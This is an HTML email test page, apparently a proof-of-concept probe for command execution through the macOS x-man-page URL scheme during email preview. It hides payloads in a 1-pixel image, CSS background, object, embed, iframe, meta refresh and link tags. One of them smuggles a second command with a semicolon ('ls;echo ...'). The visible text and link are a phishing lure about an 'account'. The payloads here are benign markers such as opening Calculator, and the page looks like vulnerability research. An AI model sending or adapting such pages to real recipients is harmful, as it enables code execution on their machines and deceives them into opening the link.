<!DOCTYPE html>
<html>
<head>
    <title>Auto-Preview Exploit Test</title>
</head>
<body>
    <h1>Important Email Preview Test</h1>
    
    <!-- Test 1: Hidden image with man page URL -->
    <img src="x-man-page://open%20-a%20Calculator" 
         width="1" height="1" 
         style="position:absolute; left:-100px;"
         alt="hidden">
    
    <!-- Test 2: CSS background with man page URL -->
    <div style="background-image: url('x-man-page://ls;echo CSS_BACKGROUND'); 
                width: 1px; height: 1px; overflow: hidden;">
    </div>
    
    <!-- Test 3: Object tag -->
    <object data="x-man-page://test" 
            type="text/plain"
            style="display:none">
    </object>
    
    <!-- Test 4: Embed tag -->
    <embed src="x-man-page://embed_test" 
           style="display:none">
    
    <!-- Test 5: Iframe (less likely but worth testing) -->
    <iframe src="x-man-page://iframe_test" 
            style="display:none"
            onload="console.log('iframe loaded')">
    </iframe>
    
    <!-- Test 6: JavaScript that might run during preview -->
    <script>
        // Some email clients might execute simple scripts during preview
        console.log('Preview script executed');
    </script>
    
    <!-- Test 7: Meta refresh -->
    <meta http-equiv="refresh" content="0;url=x-man-page://meta_refresh">
    
    <!-- Test 8: Link tag -->
    <link rel="stylesheet" href="x-man-page://link_tag">
    
    <!-- Visible content to make email look legitimate -->
    <p>Please review the attached document. This email contains important information about your account.</p>
    <p>If you have any questions, please contact support.</p>
    
    <!-- Normal-looking link that might be auto-activated -->
    <a href="x-man-page://normal_link" style="color: blue; text-decoration: underline;">
        Click here to view document
    </a>
</body>
</html>
